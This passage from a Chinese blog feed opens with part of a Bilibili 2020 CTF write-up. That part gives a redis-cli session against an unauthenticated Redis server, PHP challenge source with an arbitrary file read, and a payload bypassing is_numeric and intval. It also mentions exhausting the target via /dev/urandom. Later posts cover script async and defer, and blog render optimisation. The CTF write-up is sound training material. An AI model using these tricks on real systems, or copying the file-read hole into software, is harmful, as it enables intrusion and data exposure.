post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 